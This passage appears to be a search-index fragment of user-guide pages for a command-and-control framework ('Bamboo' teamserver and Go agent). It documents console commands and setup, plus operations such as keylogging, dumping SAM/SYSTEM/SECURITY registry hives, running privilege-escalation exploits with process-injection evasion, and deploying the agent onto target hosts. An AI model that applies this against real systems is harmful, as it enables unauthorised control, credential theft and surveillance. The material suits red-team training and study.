Shows team chat messages and agent connection updates from the Websocket connection with the Teamserver. </p> <p>(4) Tabs \u2013 Allows you to see which console you are on and switch between consoles. The default tabs that are available at all times are:</p> <ul> <li>TEAMCHAT \u2013 Allows the user to send and read messages via the Teamchat function</li> <li>CONSOLE \u2013 The main console to run general commands. </li> </ul> <p>A new agent tab (labelled by the agent id) can be created with the command <code>use [agent id]</code> in the console. This tab will allow users to use agent-specific commands to control and command the agent. </p> <p>(5) Console \u2013 Displays the command-line console for the selected tabs. For more information about the commands, refer to !!LINK TO COMMANDS` </p> <p>(6) Buttons \u2013 Buttons to command selected agent to perform select functions  The available actions using these buttons are:</p> <ul> <li>Start Enumerating \u2013 perform system enumeration on the host the Agent is on</li> <li>Toggle Keylog \u2013 Start or stop the keylogging function on the Agent</li> <li>Get Registry Hives \u2013 Get important files (sam, system, security) from the host the Agent is on. Only available for Agents at High or System privilege</li> </ul>"},{"location":"User%20Guide/commands/command_guide.html","title":"Command Guide","text":"<p>This page will show how to do some general actions using the GUI Client. </p>"},{"location":"User%20Guide/commands/command_guide.html#agent-control","title":"Agent Control","text":"<p>Commands in here assume you are in an agent console. To do that, enter <code>use [agent id]</code> in the main console and go to the new tab created. </p>"},{"location":"User%20Guide/commands/command_guide.html#run-exploit","title":"Run Exploit","text":"<p>Enter <code>exploit</code> in the agent console. </p> <p></p> <ul> <li>A popup will appear to select configurations. The options you have depend on the exploits available and the settings on them.</li> <li>First you choose an exploit from the Teamserver\u2019s database</li> <li>The next choice is the evasion technique, if injection is an option for the exploit. The choices are:<ul> <li>Drop-to-Disk \u2013 drop exploit to disk and run it. Provides no evasion</li> <li>Process Injection</li> <li>Virtual Allocation</li> <li>Gadget Injection</li> </ul> </li> <li>Choose the Donut shellcode options. Default is recommended</li> </ul> <p></p> <p>After configuration, press \"EXPLOIT\" to send the command. The console should print a message saying the exploit command is confirmed. </p> <p></p> <p>To confirm that the exploit works, observe the target machine. Exploits included with the Teamserver should spawn an elevated Agent to connect back to the Teamserver, so also pay attention to the Websocket messages. </p> <p></p>"},{"location":"User%20Guide/commands/command_guide.html#additional-actions","title":"Additional Actions","text":"<p>You can use the three commands (enum, postexp keylog, postexp retrieve) or use the buttons at the side to run them. Take note retrieving registry hives require the agent to be at least High or System privilege. </p> <p></p> <p>The results are saved in <code>/handler/postexp/</code> as printed on the console when it is completed. To access it quickly, use the Menu &gt; View files </p> <p></p>"},{"location":"User%20Guide/commands/command_guide.html#kill-agent","title":"Kill Agent","text":"<p>To end an agent, enter <code>kill [agent id]</code> in a console. It will tell the agent to terminate itself and the Teamserver will remove it from its database</p>"},{"location":"User%20Guide/commands/command_guide.html#stop-controlling-agent","title":"Stop Controlling Agent","text":"<p>To close the console of an agent, enter close in the console of the agent. This does not disconnect or terminate the agent</p>"},{"location":"User%20Guide/commands/command_guide.html#cli-commands","title":"CLI Commands","text":"<p>To access a command prompt in the agent, enter cli in the agent\u2019s console. </p> <p></p> <p>From here, you can enter commands and it will execute in a command prompt. </p> <p></p> <p>To stop using the command prompt, enter <code>exit</code> in the console.</p>"},{"location":"User%20Guide/commands/command_guide.html#exploits-management","title":"Exploits Management","text":""},{"location":"User%20Guide/commands/command_guide.html#display-exploits","title":"Display Exploits","text":"<p>Go to Menu &gt; Exploits &gt; Display Exploits </p> <p></p> <p>The available exploits in the database will be in the Display panel </p> <p></p>"},{"location":"User%20Guide/commands/command_guide.html#add-exploit","title":"Add Exploit","text":"<p>To add exploits, either enter add in a console or go to Menu &gt; Exploits &gt; Add Exploits to launch a new window to add exploits. </p> <p></p> <p>When adding exploits, the user will configure the following:</p> <ol> <li>Select the exploit to use (as an exe file)</li> <li>App version target</li> <li>Privilege level required to exploit (LPE start), and resulting privilege (LPE end)<ul> <li>If LPE start is Admin, the Teamserver will automatically set that UAC Bypass is required</li> </ul> </li> <li>Select whether Drop-to-Disk and/or Injection is suitable for the exploit.</li> </ol>"},{"location":"User%20Guide/commands/command_guide.html#modify-exploit","title":"Modify Exploit","text":"<p>To modify exploits, either enter modify in a console or go to Menu &gt; Exploits &gt; Modify Exploits to launch a new window to add exploits. </p> <p></p> <p>Use the dropdown to select the exploit to modify. The options you can modify are:</p> <ul> <li>Exploit Name - what the exploit will be saved and appear as</li> <li>App Version</li> <li>LPE Start</li> <li>LPE End</li> <li>Evasion Method</li> </ul>"},{"location":"User%20Guide/commands/command_guide.html#delete-exploit","title":"Delete Exploit","text":"<p>Deleting an exploit can be done with either the Console or the Display panel. </p> <p>Console method: </p> <ul> <li>Enter <code>delete [exploit name]</code> into a console</li> </ul> <p></p> <p>Display panel method:</p> <ol> <li>Open the table of exploits on the Display panel with Menu &gt; Exploits &gt; Display Exploits </li> <li>At the \u201cDelete exploit?\u201d dropdown, select the exploit to remove and click Confirm. </li> </ol> <p></p>"},{"location":"User%20Guide/commands/command_guide.html#user-management","title":"User Management","text":""},{"location":"User%20Guide/commands/command_guide.html#display-users","title":"Display Users","text":"<p>Go to Menu &gt; Users &gt; Display Users</p> <p></p>"},{"location":"User%20Guide/commands/command_guide.html#add-user","title":"Add User","text":"<p>To modify exploits, either enter register in a console or go to Menu &gt; Users &gt; Add User to launch a new window to add exploits. </p> <p></p> <p>Enter a username and password for the new user and click Register. You may not create a username that already exists.</p>"},{"location":"User%20Guide/commands/command_guide.html#remove-user","title":"Remove User","text":"<p>To remove a user account, you can do the following:  1. Open the table of exploits on the Display panel with Menu &gt; User &gt; Display User  2. At the \u201cDelete user?\u201d dropdown, select the user to remove and click Confirm. </p> <p></p>"},{"location":"User%20Guide/commands/command_guide.html#other-functions","title":"Other Functions","text":""},{"location":"User%20Guide/commands/command_guide.html#team-chat","title":"Team Chat","text":"<p>To access the Team Chat, go to the TEAMCHAT tab. You can send messages by entering your message in the text box</p> <p></p> <p>To remove the message history, enter the clear command in another console.</p>"},{"location":"User%20Guide/commands/command_list.html","title":"Command List","text":"<p>This page briefly lists all the commands that can be used from the Bamboo Client (CLI and GUI). For usage examples, see the other pages in the User Guide.</p> Console Command Description help Show the help menu that list all commands and descriptions exit/quit Exit Bamboo Client chat Open team chat to chat/receive chat messages from other Bamboo Client users. In GUI this is the equivalent of going to the TEAMCHAT tab clear Clear chat messages users Display all users with their status. Accessible in GUI via Menu &gt; Users &gt; Display User register --username [username] --pw [password] Register a new user into the database. Accessible in GUI via Menu &gt; Users &gt; Add User remove [handler] Remove handler from database. Accessible in GUI via Menu &gt; Users &gt; Display User and using the Delete User dropdown in the Display pane display Display all agent information. Accessible in GUI via Menu &gt; Agents &gt; Display Agents use [agent] Start using agent kill [agent] Disconnect agent and remove from database. Accessible in GUI via Menu &gt; Display Agents &gt; Agents and using the Delete agent dropdown in the Display pane exp View all exploits in database. Accessible in GUI via Menu &gt; Exploits &gt; Display Exploits add Add an exploit into the database. Accessible in GUI via Menu &gt; Exploits &gt; Add Exploits delete [exploit] Delete an exploit from the database. Accessible in GUI via Menu &gt; Exploits &gt; Display Exploits and using the Delete exploit dropdown in the Display pane modify [exploit] Modify exploit from the database. Accessible in GUI via Menu &gt; Exploits &gt; Modify Exploits <p>Commands for when an Agent is in use</p> Console Command Description stop Stop using the Agent (closes its tab in GUI). Not to be confused with the kill command info Display information of current agent exploit Command Agent to run exploit cmd Run commands in Agent enum Enumerate Agent machine. Also accessible in the GUI via the side buttons postexp [method] Run a post exploit. Also accessible in the GUI via the side buttons"},{"location":"User%20Guide/installation/agent-setup.html","title":"Agent Setup","text":""},{"location":"User%20Guide/installation/agent-setup.html#part-1-building-the-agent","title":"Part 1: Building the Agent","text":"<ol> <li>If not yet installed, install Go. </li> <li>Go to the agent directory and run the following command to download dependencies:      <pre><code>go get . \n</code></pre></li> <li>Edit default-ip.txt file to the IP address of the Teamserver </li> <li>In the Agent folder, build the Agent (with flags to reduce the size of the exe) with the command to get agent.exe      <pre><code>go build  -ldflags \"-s -w\" \n</code></pre></li> </ol>"},{"location":"User%20Guide/installation/agent-setup.html#part-2-running-the-agent","title":"Part 2: Running the Agent","text":"<ol> <li>Transfer the agent to the Desktop folder of the user in the target host.</li> <li>Ensure the Teamserver is running. </li> <li>Run the agent by either running it in a terminal or double clicking its icon</li> </ol> <p>The agent has command line options, but it is usually not required to set them. </p> Parameter Description <code>-ip &lt;addr&gt;</code> The address of the Teamserver. Default value is the string in default-ip.txt when the agent is compiled <code>-port &lt;int&gt;</code> The port which the Teamserver is running on. Default is 4444 <code>-skip-priv</code> If this parameter is included, the Agent will not check its privilege level and user.Only used for testing purposes."},{"location":"User%20Guide/installation/teamserver-setup.html","title":"Teamserver Setup","text":""},{"location":"User%20Guide/installation/teamserver-setup.html#part-1-downloading-the-files","title":"Part 1: Downloading the Files","text":"<ol> <li>Open a terminal or command prompt on your computer.</li> <li>Install Python 3.11 and make sure you have pip as the package manager.</li> <li>Clone the repository (skip this step if you already have the code).     <pre><code>git clone https://github.com/time0ut07/C2-Agent.git\n</code></pre></li> <li>Change directory into the folder.     <pre><code>    cd C2-Agent\n</code></pre></li> <li>Install requirements.     <pre><code>    pip install -r requirements.txt\n</code></pre></li> </ol>"},{"location":"User%20Guide/installation/teamserver-setup.html#part-2-setting-up-mongodb","title":"Part 2: Setting up MongoDB","text":"<p>Windows</p> <ol> <li>Download the MongoDB Community Server.</li> <li>Open MongoDB Compass and connect to the local database</li> <li>Create a database named \"C2-Server\"</li> <li>In the database, create a collection named \"user\"</li> <li>In the user collection, select add data &gt; import JSON or CSV file</li> <li>Select C2-Server.user.json from the folder</li> <li>Repeat steps 4 to 6 to create the collection \"exploits\" and import the data file C2-Server.exploits.json.</li> </ol> <p>Unix</p> <ol> <li>Install the MongoDB Community Server according to the operating system.</li> <li>Start the mongodb service     <pre><code>sudo systemctl start mongod\n</code></pre></li> <li>Using the shell command <code>[mongosh]</code>(https://www.mongodb.com/docs/mongodb-shell/) to interact with mongodb</li> <li>Create the database C2-Server if it does not exist      <pre><code>use C2-Server\n</code></pre></li> <li>Create a collection called \"user\"     <pre><code>db.createCollection(\"user\")\n</code></pre></li> <li>Import the JSON file C2-Server.user.json to the user collection with the following command:     <pre><code>mongoimport --uri=\"mongodb://localhost:27017\" --db=C2-Server --collection=user --file=C2-Server.user.json --jsonArray\n</code></pre></li> <li>Repeat steps 4 to 6 to create the collection \"exploits\" and import the data file C2-Server.exploits.json.</li> </ol>"},{"location":"User%20Guide/installation/teamserver-setup.html#part-3-running-the-teamserver","title":"Part 3: Running the Teamserver","text":"<p>Run the teamserver (to listen on all interfaces) with:  <pre><code>python teamserver.py -ip 0.0.0.0\n</code></pre></p> <p>The Teamserver uses default command line arguments to change the port and address it listens to</p> Parameter Description <code>-ip &lt;addr&gt;</code> The address of the Teamserver. Default is 127.0.0.1 <code>-p &lt;int&gt;</code> The port which the Teamserver is running on. Default is 4444"}]}